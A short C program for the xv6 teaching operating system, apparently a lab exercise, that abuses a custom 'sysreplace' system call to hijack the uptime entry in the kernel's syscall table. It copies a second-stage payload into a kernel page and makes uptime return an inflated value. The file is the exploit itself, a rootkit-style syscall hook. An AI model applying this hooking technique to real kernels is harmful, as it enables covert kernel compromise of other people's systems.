#include "types.h"
#include "stat.h"
#include "user.h"

int (*oldUptime)(void);

int exploitStage2() {
    int eip = 0;
    int (*realUptime)(void);

    // Grab our eip from eax
    asm("mov %%eax, %0" : "=r" (eip));
    realUptime = (int(*)(void)) (*(int*)(eip - sizeof(int)));
    return realUptime() + 50000;
}

void* exploitStage1() {
    int *(*kalloc)(void);
    int *newpage;

    kalloc = (int*(*)())findkalloc();
    newpage = kalloc();
    *newpage = (int)oldUptime;

    memmove(&newpage[1], &exploitStage2, 1024);
    /* sysreplace(14, (uint)newpage, (uint)&oldcall); */

    return &newpage[1];
}

int main()
{
  int u;
  oldUptime = 0;

  // Call the real uptime
  u = uptime();
  printf(1, "%d\n", u);

  // replace with exploit stage 1
  sysreplace(14, (uint) &exploitStage1, (uint) &oldUptime);

  // call exploit stage 1, kalloc and copy in stage 2
  u = uptime();

  // replace stage 1 with stage 2 in syscall table
  sysreplace(14, (uint) u, (uint) &oldUptime);

  // verify success
  u = uptime();
  printf(1, "%d\n", u);

  exit();
}
